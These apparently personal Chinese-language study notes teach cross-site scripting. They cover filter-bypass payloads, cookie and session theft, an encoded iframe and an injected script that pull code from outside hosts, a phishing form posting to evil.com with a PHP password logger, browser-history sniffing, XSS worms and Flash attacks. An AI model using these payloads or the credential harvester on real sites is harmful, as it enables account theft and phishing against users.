---
title: XSS
date: 2023-09-03T15:29:52+08:00
updated: 2023-04-09T17:25:21+08:00
categories: 
- 渗透测试
- 外网漏洞
---

# 2.XSS(跨站脚本攻击)

## 2.1 XSS简介

（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是[代码注入](https://zh.wikipedia.org/wiki/代碼注入)的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了[HTML](https://zh.wikipedia.org/wiki/HTML)以及用户端[脚本语言](https://zh.wikipedia.org/wiki/腳本語言)。

**XSS**攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是[JavaScript](https://zh.wikipedia.org/wiki/JavaScript)，但实际上也可以包括[Java](https://zh.wikipedia.org/wiki/Java)，[VBScript](https://zh.wikipedia.org/wiki/VBScript)，[ActiveX](https://zh.wikipedia.org/wiki/ActiveX)，[Flash](https://zh.wikipedia.org/wiki/Flash)或者甚至是普通的[HTML](https://zh.wikipedia.org/wiki/HTML)。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、[会话](https://zh.wikipedia.org/wiki/会话)和[cookie](https://zh.wikipedia.org/wiki/Cookie)等各种内容。

XSS是一个非常重要的漏洞，2010年统计来看，XSS已经是世界排名第二的漏洞，因此我们要给予足够的重视。

## 2.2 XSS的分类

常见的XSS我们通常可以分为三种类型，**反射性**，**存储型**，**DOM based xss**;接下来我们分别介绍这三种类型；

### 2.2.1 反射型XSS

反射型XSS，顾名思义，是攻击者在页面插入恶意代码，将用户输入数据“反射”给浏览器，用户点击时会执行的一种漏洞，因此，通常需要用户自行点击，也称为“非持久型XSS”；

### 2.2.2 存储型XSS

存储型XSS，相较于反射型XSS更为复杂，当存在存储型XSS时，用户输入的数据会被保存在服务器端；最简单的例子，攻击者在自己的服务器端搭建含有存储型XSS的恶意代码，并发布这篇含有恶意代码的博客，当用户查看这篇博客时，就会执行这段代码，从而丢失数据信息，这种XSS更为持久，因此也被称为“持久型XSS”；

### 2.2.3  DOM based xss

DOM型与其他类型XSS的本质区别在于，DOM型XSS不需要经过服务器端解析，而是直接解析在前端页面，这里使用pikachu靶场进行演示；

[推荐先学习DOM是什么](https://www.w3school.com.cn/js/js_htmldom.asp)

```html
 <div id="xssd_main">
                <script>
                    function domxss(){
                        var str = document.getElementById("text").value;
                        document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
                    }
                </script>
                <input id="text" name="text" type="text"  value="" />
                <input id="button" type="button" value="click me!" onclick="domxss()" />
                <div id="dom"></div>
            </div>
```

我们通过源码来进行分析；首先定义一个str接受id名为text的属性的值,test的值由我们来提交,将id=dom的属性的值改为:`"<a href '"+str+"'>what do you see?</a>"`，标签为"a";a标签的str来源于上方的获取；我们随意输入一串字符像“fumo"

![dmoxss1](E:\笔记软件\笔记\从零开始的web安全\dmoxss1.png)

可以看到href被改为了fumo，当我们输入' onclick="alert('fumo')">时再点击what do you see 就会执行弹窗

![domxss2](E:\笔记软件\笔记\从零开始的web安全\domxss2.png)

此时代码如图，这串代码只会在前端执行，并没有与服务器端产生任何交互。

![domxss3](E:\笔记软件\笔记\从零开始的web安全\domxss3.png)

## 2.3 XSS漏洞进阶

### 2.3.1 利用XSS盗取cookie

小tips:

```
在当前浏览器页面地址栏输入javascript:alert(document.cookie)会弹出当前页面的cookie
```

这里使用留言板进行测试；由于留言板禁用了<script>标签，我选择一个<img>标签的payload进行使用；

![guestbook1](E:\笔记软件\笔记\从零开始的web安全\guestbook1.png)

插入内容中，我们即可看到项目中返回的cookie;

![guestbook2](E:\笔记软件\笔记\从零开始的web安全\guestbook2.png)

接下来即可使用cookie登录后台；重新开一个浏览器，访问返回的地址，发现登陆失败，我们进行cookie的添加；再次访问返回的后台地址，成功登录，至此，我们完成了最简单的XSS盗取cookie登录后台的利用；

### 2.3.2 绕过xss-filter

利用漏洞的过程不总是一帆风顺的，我们会遇到很多过滤，很多禁止字符，这就需要我们利用特殊的姿势进行绕过；

(1)直接利用<>注射 html/js

这种情况其实非常少见，在一般情况下，<>都是被过滤掉的，以防止我们使用<>来操纵标签植入代码，如果禁用了<>;

很多代码就不能使用，例如：

`<script>shellcode</script>`

(2)利用html标签属性值执行xss

很多html标签支持javascript:[code]伪协议的形式，我们利用这个性质控制标签属性值进行XSS，例如：

`<img src="javascript:alert('xss');"> `

需要注意的是并不是所有浏览器都支持这类伪协议；

(3)利用空格，回车，tab键进行绕过

如果过滤仅仅是把敏感词拿到黑名单中检查，我们可以采用使用空格，回车和tab键的形式，例如过滤了javascript关键字：

`<img src="javas	cript:alter(/xss/);">`

这里的间隔便是用tab键进行分割，同样可以执行alter(/xss/)的命令，这种拆分法可以绕过很多关键词的过滤；

出现这种状况的原因比较复杂，主要是javascript对语句的检索，当一行中有多个语句时必须使用分号，只有一句则可以省略分号；

```html
var a 
="hello world";
alter(a);
//javascript会查询一个完整的语句到结束，所以即便存在换行符，a同样可以赋值成功；
<img src="javas
cript:
alter(/xss/)"width=100>
成立
```

(4)转码绕过

由于html属性值支持ascii码的形式，我们可以将字符转换为ascii码进行执行，例如：

`<img src="javascript&#58alert(/xss/);">` &#58是':'的ascii形式；

我们甚至可以全部转码

`<iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#48;&#120;&#46;&#97;&#120;&#47;&#49;&#112;&#99;&#68;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>`

还可以把&#01.&#02插入头部，同理回车空格tab键的ascii转码可以插入任意位置;

(5)事件处理函数

事件处理函数可以让我们不使用属性就可以完成跨站脚本；

eg: `<input type="button" value="click me" onclick="alert(/xss/)" />`

当我们点击按钮之后就会出现弹窗；当然这样的函数并不只是onclick,也会有很多其他函数

[更多事件函数](https://www.runoob.com/jsref/dom-obj-event.html)

(6)css跨站剖析

利用css样式表来解析XSS脚本；CSS虽然很隐蔽，但需要注意的是不同的浏览器可能不能通用；

主要了解css跨站，import,expression引用 ；

(7)扰乱过滤规则

转换大小写，大小写混用，双引号改单引号或者是不使用引号；

![rule1](E:\笔记软件\笔记\从零开始的web安全\rule1.png)

利用全角字符替换半角字符；

利用样式表中/**/注释字符的特性，来插入过滤内容；

```
<XSS STYLE="xss:expr/*fumo*/ession(alert('xss'))">
<div style="wid/**/th: expre/*fumo*/ssion(alert('XSS'));" >
```

除/**/以外，样式标签中的\和结束符\0也被浏览器忽略；

### 2.3.3 字符编码的利用

可将字符转化为十进制编码，16进制等形式的编码进行绕过

```html
<iframe WIDTH=0 HEIGHT=0 srcdoc=。。。。。。。。。。&#60;&#115;&#67;&#82;&#105;&#80;&#116;&#32;&#115;&#82;&#67;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#48;&#120;&#46;&#97;&#120;&#47;&#49;&#112;&#99;&#68;&#34;&#62;&#60;&#47;&#115;&#67;&#114;&#73;&#112;&#84;&#62;>
```

同上可以在编码后加上; 

或者使用&#000,这里的0数量不定；

16进制可以使用如下形式进行执行，使用eval函数；

```
<script>
eval("\xxx\xxx\xxx\xxx\xxx");
</script>
```

使用eval函数执行10进制代码需要配合String.fromCharCode()使用，这个函数将字符转化为ascii码值；

```
eg: 
<img src="javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
```

JScript Encode和VBScript Encode

利用二者加密的脚本可正常在IE浏览器下执行；

### 2.3.4 跨站拆分法

当网站没有限制<>等字符，但是对字符长度有过滤，网站可以重复留言的情况下，我们可以使用跨站拆分法；

![kuazhan1](E:\笔记软件\笔记\从零开始的web安全\kuazhan1.png)

最后通过eval执行了xss代码；

### 2.3.5 调用shellcode

(1)动态调用远程javascript

将XSS代码保存在服务器再进行调用；

```
var s=document.creatElement("script");
s.src="http://www.xxxx.com/xss.js";
document.getElementByTagName("head")[0].aapendChild(s);
xss.js中存储着我们的恶意代码
```

(2)使用windows.location.hash

原理上，使用location.href来管理页面的url，再location.href=url(url自定义)即可对当前页面进行重定向；

location.hash则可以用来获取或设置页面的标签值；

(3)xss下载器

打造一个XSS downloader,事先将shellcode写在网站页面，再利用XMLHTTP控件向网站发送HTTP请求（POST或GET），执行返回的数据；

### 2.3.6 session会话劫持

与cookie的区别:cookie存储在浏览器或是客户端，而session存储在服务端内存内，关闭浏览器(关闭进程)，session就会被清除

例如：攻击者想要添加管理员账号，可以使用firebug劫持http通信数据，添加即可；

**xss获取webshell**

通过向网站写入恶意代码，上传后门，就可以劫持管理员备份数据库的会话，从而拿到webshell;

### 2.3.7 xss网络钓鱼

**XSS Phishing**

(1)钓鱼页面

尽量做到与原网站相似，html代码可从原网站复制，主要是登陆表单；

然后将原表单的登陆地址修改例如：

```
<form method="post" action="http://www.evil.com/get.php">
//这里的get.php放在自己的vps上用来接收登录信息
```

(2)接收登录信息

get.php内容如下

```php
<? php
$data = fopen("logfile.txt","a+");
$login = $_POST['username'];
$pass = $_POST['password'];
fwrite($data, "Username: $login\n");
fwrite($data, "Password: $pass\n");
fclose($data);
Header("location: http://target.com");
?>
//header头用于重新定向到原网站
//接收数据形式应与原网址一致
```

(3)XSS Phishing Expliot

![phishing](E:\笔记软件\笔记\从零开始的web安全\phishing.png)

**xss钓鱼的方式**

(1)xss重定向钓鱼

将原目标网站重新定向到恶意的钓鱼网站

```html
http://www.xxx.com/index.php?search="'><script>document.location.href="http://www.emp.com"</script>
```

(2)html注入式钓鱼

直接利用XSS漏洞注射html/javascript代码到页面中；

(3)XSS跨框架钓鱼

利用iframe引用第三方内容伪造登陆控件，主页面仍然是正常的域名，隐蔽性较高；

(4)flash钓鱼

利用flash文件进行钓鱼，flash好像已经没有更新了；

**更高级的钓鱼方式**

当设置了httponly时，我们无法再通过截取cookie来达到获得用户权限，更为简单的利用方式直接注入js脚本劫持html表单和控制web行为

### 2.3.8 css/javascript history hack

原理：利用CSS能自定义访问过的和为访问过的超级链接样式。由于javascript可以读取任何元素的CSS信息，能分辨浏览器应用了哪种样式和用户是否访问过该来链接；

```html
	<H3>Visited</H3>
	<ul id="visited"></ul>

	<H3>Not Visited</H3>
	<ul id="notvisited"></ul>
	<script type="text/javascript">
	var websites = [
		"http://ha.ckers.org/blog/",
		"http://login.yahoo.com/",
		"http://mail.google.com/",
		"http://mail.yahoo.com/",
		"http://my.yahoo.com/",
		"http://sla.ckers.org/forum/",
		"http://slashdot.org/",
		"http://www.amazon.com/",
		"http://www.aol.com/",
		"http://www.apple.com/",
		"http://www.bankofamerica.com/",
		"http://www.bankone.com/"
	];

	/* Loop through each URL */
	for (var i = 0; i < websites.length; i++) {
		
		/* create the new anchor tag with the appropriate URL information */
		var link = document.createElement("a");
		link.id = "id" + i;
		link.href = websites[i];
		link.innerHTML = websites[i];

		/* create a custom style tag for the specific link. Set the CSS visited selector to a known value, in this case red */
		document.write('<style>');
		document.write('#id' + i + ":visited {color: #FF0000;}");
		document.write('</style>');
		
		/* quickly add and remove the link from the DOM with enough time to save the visible computed color. */
		document.body.appendChild(link);
		var color = document.defaultView.getComputedStyle(link,null).getPropertyValue("color");
		document.body.removeChild(link);
		
		/* check to see if the link has been visited if the computed color is red */
		if (color == "rgb(255, 0, 0)") { // visited
		
			/* add the link to the visited list */
			var item = document.createElement('li');
			item.appendChild(link);
			document.getElementById('visited').appendChild(item);
			
		} else { // not visited
		
			/* add the link to the not visited list */
			var item = document.createElement('li');
			item.appendChild(link);
			document.getElementById('notvisited').appendChild(item);
			
		} // end visited color check if

	} // end URL loop
	</script>
```

遍历查询用户是否访问过某些网站；

## 2.4 客户端信息刺探

### 2.4.1 javascript实现端口扫描

[端口扫描工具](https://www.gnucitizen.org/blog/javascript-port-scanner/)

还有很多其他工具，这个不一定好用；

### 2.4.2 截获剪切板内容

截获用户的剪切板信息是为了获取用户可能截取的关键信息；

###  2.4.3 获取客户端IP

[介绍链接](https://juejin.cn/post/6844903984356917256)

**更多可以和xss进行联动的攻击例如DDOS，XSSworm请自行搜寻**

## 2.5 XSS工具利用

### 2.5.1 firebug

firefox插件，可动态修改页面，并将结果反映到浏览器窗口，可抓取流量包，具有dom查看器，并且firebug具有查看最终源代码的功能；

### 2.5.2 Tamper Data

类似于轻量化的bp抓包功能

### 2.5.3 Live HTTP Headers

拦截流量包，添加了replay功能；

### 2.5.4 Fiddler

抓包工具，可查看所有数据包以及返回内容；

**bp具有以上工具的大部分功能**

## 2.6 XSS漏洞挖掘

###  2.6.1 黑盒工具测试

(1)Acunetix

(2)XssDetect

(3)ratpeoxy

**手动黑盒测试**

测试内容：

<> ，xss，&,#等重要字符是否过滤，输入这类字符后，在页面查看是否转码或是编译；

也可以直接使用完整的XSS代码进行测试；

如果过滤了<>等字符，我们可以采用事件触发xss

```html
origin:
<input name="name" value=<?=$xxx?>>
//其中$xx为动态内容,赋值为xss onmouseover=evil_script(),得到最终渲染内容
<input name="name" value=xss onmouseover=evil_script()>
//执行事件
```

对url的测试

通常我们可以看出url中的参数，我们对这些参数分别赋值测试即可

```html
eg:我们有如下url
www.test.com?a=123&b=123&c=123
我们的测试方法为
www.test.com?a=alert<"xss'>&b=123&c=123
//同理对b,c进行赋值
```

通常我们会遇到需要闭合标签的情况，例如

```
<input type="text" name="address" value="xss">
XSS为我们可控制的值，我们就可以闭合标签;
//xss  "><script>alert(/xss/)</script><"
<input type="text" name="address" value=""><script>alert(/xss/)</script><"">
//从而执行我们的代码；
```

## 2.7 XSS源代码审计

源代码审计，即白盒测试，在拥有源代码的情况下我们对XSS漏洞进行挖掘并修复；

基本思路：

寻找页面可输出变量，检验他们是否受到控制，跟踪变量的传递方式，查看过滤以及是否被htmlencode();

通常存在动态内容的标签

```html
input style img.......
```

**获取可控动态变量**

**php**

查看全局变量

![phpgloabal](E:\笔记软件\笔记\从零开始的web安全\phpgloabal.png)

这些对象我们通常都需要审计；

**javascript**

**DOMXSS挖掘**

```html
假设我们有如下代码
<html>
 <head>
    <title> DOM XSS Test</title>
</head>
<body>
    <script>
        var a=document.URL;
            document.write(a.substring(a.indexOf("a=")+2,a.length));
        </script>
    </body>
</html>
```

这段代码的作用是从rul接收一个a，并将a打印在首页，且并没有进行过滤，我们可以利用a；

```
?a=<script>alert('xss')</script>
```

浏览器会将html文本解析成dom，并返回代码执行结果；

domxss发掘

```
document.referrer属性
window.name属性
location属性
//重点检查用户输入源，例如上述属性值
```

挖掘输出位置，即字符串在页面的输出位置列入:innerHTML,document.write等函数

二者基本思路：跟踪函数变量，查看是否能够控制；

**FlashXSS发掘**

flash具有内置编程语言ActionScript;ActionScript语言编写不规范，同样能造成XSS；

ActionScript2.0具有类似于php注册全局变量的特性，任何未初始化的变量都可以通过flashvar进行初始化；

```
例如:
if(checkLogin()){
	user=true;
}
if(user){
	manager();
}
我们只需要?user=true即可绕过过滤;
```

![actionscript](E:\笔记软件\笔记\从零开始的web安全\actionscript.png)

要挖掘flash，我们需要多.swf文件反编译，得到actionscript代码，推荐使用action script viewer;

同样的，我们需要寻找可以控制的输入点，特别是load*方法;

## 2.8 利用语言特性

**phpinfo()**

```
<?php
phpinfo();
?>
//编写如下文件，执行得到phpinfo界面
```

在低版本的phpinfo()中，对用户输入的变量没有转义就打印出来，攻击者可以通过构造特殊url向phpinfo()中注入html代码引起xss;

```
http://127.0.0.1/phpinfo.php?a[]=<script>alert(/xss/);</script>
//经测试5.3.29版本已经具有转义功能
```

**$_SERVER[PHP_SELF]**

该代码表示php文件相对于网站根目录的相对位置，假设有如下代码

```php
<form method="POST" action="<?php echo $_SERVER['PHP_SELF'];?>">
		<input type="hidden" name="submitted" value="1" />
		<input type="submit" value="Submit!" />
</form>
```

我们把它保存在data.php中，构造，并执行xss弹窗；

```
http://127.0.0.1/data.php/%22%3E%3Cscript%3Ealert('xss')%3C/script%3E%3C
```

问题出在<?php echo $_SERVER['PHP_SELF']>，该代码直接输出PHP_SELF变量，该变量可由用户控制

```
推荐使用htmlentities($_SERVER['PHP_SELF'])来替代，我们使用该函数后，上述的代码便不再有效,当然很多$_SERVER变量都有可能存在该问题；
```

**变量覆盖**

当可以变量覆盖的时候，我们可以轻易地执行xss；下面列举几种能引起变量覆盖的情况；

(1)register_globals=on

该参数在php4.2.0以上的php版本默认屏蔽，当该变量被打开时，各种变量都可以被重新注册，包括来自html表单的请求变量，由于php变量使用前不需要进行初始化，所以可以直接使用；该参数已在php5.4以上版本进行移除；

(2)extract

该函数用于将变量从数组导入到当前符号表中；

假设具有如下代码，

```php
<?php
$a=1;
extract($_GET);
echo $a
?>
```

由于$a已经被初始化，我们访问extract.php页面，理所当然得到1,注意GET传递的参数，我们试着覆盖变量$a;

```
http://127.0.0.1/extract.php?a=<script>alert(/xss/)</script>
```

就能够正常的执行弹窗；

(3)遍历初始化变量

遍历初始化变量同样会造成变量覆盖；使用foreach()函数模拟全局操作；

```php
<?php 
	$a=1;
	foreach($_GET as $key => $value){
		$$key =$value;
	}
	print $a;
```

传递

```
a=b&b=<script>alert(/xss/)</script>
```

很简单我们就能利用这个变量覆盖执行xss;

## 2.9 XSS Worm 剖析

### 2.9.1 初步了解web 2.0

已知web1.0在于连接用户和网站，网站提供什么，用户就只能读到什么，而web2.0与web1.0最大的区别在于连接用户与用户，增大了用户获取的信息面；

同时也造成了更多的安全隐患，我们能够利用web2.0进行更广泛的钓鱼，csrf，ajax,flash;

### 2.9.2 Ajax技术

**简析Ajax**

这里研究ajax技术是为了更好的研究xss蠕虫

传统的Web应用允许用户端填写表单（form），当提交表单时就向[网页服务器](https://zh.wikipedia.org/wiki/網頁伺服器)发送一个请求。服务器接收并处理传来的表单，然后送回一个新的网页，但这个做法浪费了许多带宽，因为在前后两个页面中的大部分[HTML](https://zh.wikipedia.org/wiki/HTML)码往往是相同的。由于每次应用的沟通都需要向服务器发送请求，应用的回应时间依赖于服务器的回应时间。这导致了用户界面的回应比本机应用慢得多。

与此不同，AJAX应用可以仅向服务器发送并取回必须的数据，并在客户端采用JavaScript处理来自服务器的回应。因为在服务器和浏览器之间交换的数据大量减少，服务器回应更快了。同时，很多的处理工作可以在发出请求的[客户端](https://zh.wikipedia.org/wiki/客户端)机器上完成，因此Web服务器的负荷也减少了。

类似于[DHTML](https://zh.wikipedia.org/wiki/DHTML)或[LAMP](https://zh.wikipedia.org/wiki/LAMP)，AJAX不是指一种单一的技术，而是有机地利用了一系列相关的技术。虽然其名称包含XML，但实际上数据格式可以由[JSON](https://zh.wikipedia.org/wiki/JSON)代替以进一步减少数据量。而客户端与服务器也并不需要异步。一些基于AJAX的“派生／合成”式（derivative/composite）的技术也正在出现，如[AFLAX](https://zh.wikipedia.org/wiki/AFLAX)。

简单来说Ajax就是将简单的处理交给了客户端，并且传递更新内容，页面相应更新内容，并不在需要再发送完整的数据，从而提高用户体验；

**XMLHttpRequest对象**

建立一个XMLHttpRequest对象方法如下：

```javascript
try
{
	httpRequest = new ActiveXObjext("Msxml2.XMLHTTP"); //IE5,IE6使用ActiveXObjext对象
}//IE7+、Firefox、Chrome、Safari 以及 Opera均内键xmlhttprequest对象，variable=new XMLHttpRequest();即可
catch (e)
{
	try{
		httpRequest = new ActiveXObjext("Microsoft.XMLHTTP");
	}
	catch (e){
		httpRequest = new flase;
	}
}
```

该代码创建了一个ActiveXObject对象，传入的参数是ActiveX对象的progID,此处为Msxml2.XMLHTTP;

为了通融浏览器版本问题，我们通常使用以下代码；

```javascript
var xmlhttp;
if (window.XMLHttpRequest)
{
    //  IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码
    xmlhttp=new XMLHttpRequest();
}
else
{
    // IE6, IE5 浏览器执行代码
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}
```

(1)XMLHttpRequest 对象的方法

![xmlhttprequest](E:\笔记软件\笔记\从零开始的web安全\xmlhttprequest.png)

(2)xmlhttprequest对象的属性

![xmlhttprequest2](E:\笔记软件\笔记\从零开始的web安全\xmlhttprequest2.png)

### 2.9.3 HTTP请求

**发送get.post请求**

```
//get
var xml=new getXmlHttpRequest();//创建请求
xml.open("GET","/web/url.php?"+data,true)//初始化请求
xml.send();; //建立连接并发送数据
//post
var xml=new getXmlHttpRequest();//创建请求
data="id=11&username=xxx&password=xxx";//设置发送数据
xml.open("POST","/web/regist.php",true)//初始化请求
xml.setRequestHeader("Content-Type","appliacation/x-www-form-urlencode");//设置content-type头部，数据以何种形式发送
xml.send(data);; //建立连接并发送数据
```

### 2.9.4 HTTP响应

如需获得来自服务器的响应，请使用 XMLHttpRequest 对象的 responseText 或 responseXML 属性。

responseText返回字符串，responseXML返回XML形式的响应数据；

看一个浅显的例子；

```php
var xmlhttp;
if (window.XMLHttpRequest)
{
    xmlhttp=new XMLHttpRequest();
}
else
{
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}//创建对象
xmlhttp.onreadystatechange=function() //在文档状态更新时调用
	{
		if (xmlhttp.readyState==4 && xmlhttp.status==200)
		{ 	//xml =xmlresponseXML;xml=xmlresponseText;
			xml=null;
		}
	}
	xmlhttp.open("GET","web/url.php?",true);
	xmlhttp.send();
```

### 2.9.5  XSS Worm介绍

XSS worm 实质上是一段脚本程序，通常由javascript或者Vbscript编写而成，在用户浏览xss页面时被激活，站点利用该特性进行传播和感染；类似的还有csrf worm;

**攻击原理简析**

XSS蠕虫通常使用了大量的Ajax技术，由于异步的特性，使得利用ajax的xssworm具有更强的隐蔽性，具有更快的传播速度；

完整的XSS蠕虫攻击流程如下

攻击者发现目标网站存在xss漏洞并且可编写xss蠕虫

利用一个宿主（如博客空间）作为传播源头进行XSS攻击

当其他用户访问存在XSS蠕虫的博客时，执行以下操作：

​	判断用户是否登录i，登录则执行下一步否则执行其他操作

​	继续判断用户是否被感染，没有则将其感染；否则跳过；

**攻击行为**

XSS' or

(1)寻找xss点

和挖掘xss漏洞一致，我们要在目标的日志，留言等地获得一个alert()弹窗

(2)实现蠕虫行为

将XSS shellcode写入后，诱导其他用户点击该网站，用户访问后就会受到劫持，攻击者就可以利用ajax修改用户信息，并将恶意代码添加进去，此过程会不断持续，利用XMLHttpRequest对象，可在后台执行任意操作

(3)收集蠕虫数据

我们可以使用抓包工具来得到蠕虫所需要的“唯一值”数据，例如用户的id等

(4)传播和感染

###  2.9.6 运用dom技术

常见方法为给出一个特定标识符，然后使用document和getElementByld()来访问；

```html
<div>
var div1 =document.getElemnetById("div1");//遍历dom
document.getElementByname //获得指定name的<html>标签的相关信息
doucument.getElementTagName //获得指定的<html>标签相关信息
dom元素无非两种：文本和元素，使用innerHTML属性就可以从一个元素中提取所有的html和文本。
<div id="tr1">
<h1>hello world!</h1>
</div>
<script>
alert(document.getElementById("tr1").innerHTML);
</script>
使用innerHTML方法还可以向HTML DOM中插入新的内容，具体实例如下：
<a href="#" onclick="this.innerHTML='<h1>this is new message</h1>' ">old message</a>
a.beforeBegin //插入到标签开始标记前
b.afterBegin //插入到标签开始标记后
c.beforeEnd //插入到标签结束标记前
d.afterEnd //插入到标签结束标记后
```

dom技术还可获取和设置元素特性的值

```
id("domid").getAttribute("id"); //获取特性
tag("input")[0].setAttribute("value","your name"); //设置特性的值
```

修改dom的主要方法是使用createElement()函数，该函数可以让用户即刻创建新的元素；

document.createElenment()能在对象中创建一个对象，通常会与appendChild()或insertBefore()联合使用。appendChild()在节点的子节点列表末添加新的子节点，insertBefore()在节点的子节点列表的任意位置插入新的节点；

```html
<html>
<body>
<script>
var o = document.body;//创建链接
function creatA(url,text)
{
	var a = document.createElement("a"); //创建一个<a>元素
	a.href =url; //设定链接的url地址
	a.innerHTML=text; //设置名称
	a.style.color="red"; //设定链接颜色
	o.appendChild(a); 
	}
	creatA("http://uu2fu3o.com/","playsec");
	</script>
	</body>
	</html>
```

还可以使用javascript方法进行辅助,例如indexOf/substring/lastindexOf

IndexOf方法：返回String对象内第一次出现子字符串的位置

substring方法：返回位于String对象中的指定位置的字符串

function substring(start: number,end : number) :String

如果start和end为负数，则会替换为0；

**xss蠕虫通常会与csrf形成绑定，造成更加效率的攻击，网络上也有很多实战记录**

## 2.10 Flash简介

### 2.10.1 flash和swf

swf为flash的专属格式，flash player可运行swf文件，swf文件可以直接嵌入到网页中执行

### 2.10.2 嵌入flash文件

```
(1)使用<embed>标签
<html>
	<body marginwidth="0" marginheigth="0">
		<embed width="100%" height="100%" name="plugin">
		src="xxx.swf" type="application/x-shockwave-flash"/>
	</body>
</html>
(2)使用<object>标签
(3)使用<object>+<embed>标签
```

### 2.10.3 ActionScript 语言

flash内置的脚本语言-ActionScript,该语言基于javascript,具有类似的语法和结构，但本质上却截然不同，actionscript使用的脚本完全由flash player解释和处理，与查看文件的浏览器无关，而javascript使用的外部解释程序则很具浏览器的不同而不同；

### 2.10.4 flash安全模型

**flash sandbox**

安全域是flash中最顶级的沙箱，不同的安全与使得swf文件运行在自身的沙箱下；

如果连个swf文件位于不同的沙箱下，二者数据不可相互获取；

如果想让二者进行通讯，可通过信任授权(方法:Security.allow.Domain())来实现。

Security.allow.Domain("*")会为所有域中的swf授权访问；

非swf格式文件不能调用allowDomain 代码，这类文件由另一种方法Cross Domain Policy文件处理；

### 2.10.5 CRoss  Domain Policy

类似于javascript中的同源策略；

![crossdomainpolicy](E:\笔记软件\笔记\从零开始的web安全\crossdomainpolicy.png)

唯一能让flash实行跨域请求的是网站根域名下的crossdomain.xml文件

该文件定义了可被flash player加载的安全网站域名，并限制读取数据的位置i和内容，例如

```xml
<?xml version="1.0"?>
<cross-domain-policy>
<allow-access-from domain="*.target.com"/>
<allow-access-from domain="www.test.org"/>
<allow-access-from domain="123.202.0.1"/>
</cross-domain-policy>
```

则该文件允许来自上述三个域名的跨域请求

除了allow-access-from节点，根节点下还包含另外三个子节点；

![crossxmldomain](E:\笔记软件\笔记\从零开始的web安全\crossxmldomain.png)

如果设置了permitted-cross-domain-policies的by-content-type相关属性后，黑客就可以上传文件来定义自己的策略文件；

### 2.10.6 设置管理器

本地flash player自行设置安全域等

## 2.11 Flash客户端攻击剖析

### 2.11.1 getURL()&XSS

**clickTAG**

该变量用于跟踪广告，提供广告的显示范围，事件点击次数，时间；

```
利用<embed><object>插入广告横幅
<embed
src="http://www.test.com/xxxx.swf?clickTAG=http://test.com/track?http://example.com
">
```

如果没有正确检查clickTAG变量，就有可能执行xss

```
例如
getURL(clickTAG,"_top")
传入?clickTAG=javascript:alert(/xss/)就可以执行弹窗
```

getURL函数的作用将来自特定URL的文档加载到窗口中，或将变量传递到位于所定义的另一个URL的另一个应用程序

![getURL](E:\笔记软件\笔记\从零开始的web安全\getURL.png)

如果我们使用javascript来替换，就能得到弹窗

```
getURL("javascript:alert(document.cookie)")
假设有如下脚本
getURL("javascript:void(0)","_self","GET");
访问http://xxx.x.x.x/xxx.swf?a=0:0;alert(/xss/);
即可触发弹窗
```

actionscript3不支持getURL,用actionscript2.0编写即可

![flashhighrisk](E:\笔记软件\笔记\从零开始的web安全\flashhighrisk.png)

### 2.11.2 cross site flashing

XSF通常来自两个不同的域，当使用某方法载入另一个swf时，就能获取相同的安全沙箱

当网页使用*Script去解析一个flash影片时也会产生xsf

```html
例如
loadMovie(_root.mURL+'/movie2.swf')//不一定是loadMovie方法
访问
http://host/foo.swf?mURL=asfunction:getURL,javascript:alert(xss)//
结果为
loadMovie('asfunction:getURL,javascript:alert(xss)///movie2.swf')
触发弹窗
```

![loadMovie](E:\笔记软件\笔记\从零开始的web安全\loadMovie.png)

asfunction伪协议是一个专用于Flash的HTML附加协议，允许用户通过超级链接调用函数或一个带参的函数；

### 2.11.3 Flash参数型注入

(1)反射型flash参数注入

当lfash视频的名称作为url参数暴露在外时，攻击者可以控制装入flash的变量，加载一个恶意flash视频

```
print '<object type="application/x-shockwave-flash" data ="' . $params{movie}'"></object>'
传入http://xxx.x.x.x/index.cgi?movie=myMovie.swf?globalVar=e-v-i-l
```

(2)附带FlashVars的反射型注入Flash参数注入

该方法使用Flash Vars属性，该属性可在**<object>**标签中指定，用来传递全局Flash 参数。AS2.0中，FlashVars会被自动导入到Flash应用程序的变量空间

(3)FlashVars注入

当任意的object标签接收参数时都可能导致该种攻击

```
print '<object type="application/x-shockwave-flash" '.
'data="myMovie.swf"'.
'width="'.$params{width}.
'"height="'.$params{height}.
'"></object>';
由于width和height没有进行过滤，所以
http://xxx.x.x.x/myMovie.cgi?width=600&height=600"flashvars="globalVar=e-v-i-l
```

(4)基于dom的flash参数注入 

当document.location 变量被用作Flash参数时，会导致此类攻击

(5)持久型flash参数注入

该类情况发生在Flash Cookie被保存下来并且被加载到Flash视频下的情况

(6)利用flash进行钓鱼

## 2.12 利用Flash 进行XSS攻击剖析

决定性因素：allowScriptAccess属性

该属性决定了flash是否能够执行脚本代码

![allowScriptAccess](E:\笔记软件\笔记\从零开始的web安全\allowScriptAccess.png)

当该属性没有被严格控制时，我们就可以利用flash来执行xss

```html
有如下脚本代码,保存为xss.swf
getURL('javascript:alert(123);');
嵌入HTML代码中
<object id="xxx" width="200" height="150">
	<param name="movie" value="movie.swf">
	<embed AllowScriptAccess="always" name="xxx" src="xss.swf" type="application/x-shockwave-flash" width="200" heigth="200">
	</embed>
</object>
直接访问即可弹窗
```

除了getURL方法，AS3.0中还能使用Externalinterface类来执行javascript脚本

![Externalinterface](E:\笔记软件\笔记\从零开始的web安全\Externalinterface.png)

(1)传统派

ExternalInterface.call("alert","xss")

//第一个参数为函数名，第二个参数是要传递的参数

(2)直接执行javascript语句

ExternalInterface.call("function(){alert('xss');}");

